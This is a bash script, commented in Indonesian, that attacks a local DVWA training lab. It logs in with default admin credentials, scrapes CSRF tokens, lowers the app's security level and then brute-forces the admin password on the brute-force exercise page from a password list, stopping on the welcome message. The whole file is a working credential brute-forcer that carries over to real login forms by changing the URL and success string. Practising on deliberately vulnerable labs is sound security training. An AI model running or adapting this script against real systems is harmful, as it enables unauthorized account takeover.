#!/bin/bash
TARGET="http://127.0.0.1:8000"
COOKIE="./cookie.txt"
rm -f $COOKIE

echo "[*] Login..."
PAGE=$(curl -s -c $COOKIE "$TARGET/login.php")
T1=$(echo "$PAGE" | grep user_token | sed "s/.*value='//" | cut -d"'" -f1)
curl -s -L -b $COOKIE -c $COOKIE --data "username=admin&password=password&Login=Login&user_token=$T1" "$TARGET/login.php" > /dev/null

echo "[*] Ganti ke LOW (ambil token security)..."
SEC_PAGE=$(curl -s -b $COOKIE "$TARGET/security.php")
T2=$(echo "$SEC_PAGE" | grep user_token | sed "s/.*value='//" | cut -d"'" -f1)
curl -s -L -b $COOKIE -c $COOKIE --data "security=low&seclev_submit=Submit&user_token=$T2" "$TARGET/security.php" > /dev/null

# cek beneran ke ganti gak
curl -s -b $COOKIE "$TARGET/security.php" | grep -i "Security Level" | head -1

echo "[+] Mode LOW - Mulai brute"
while read -r PASS; do
  RESP=$(curl -s -G --data-urlencode "username=admin" --data-urlencode "password=$PASS" --data-urlencode "Login=Login" -b $COOKIE "$TARGET/vulnerabilities/brute/")
  echo "[*] Trying: $PASS"
  if echo "$RESP" | grep -q "Welcome to the password protected area"; then
    echo "[+] FOUND! -> $PASS"
    break
  fi
done < passlist.txt
rm -f $COOKIE
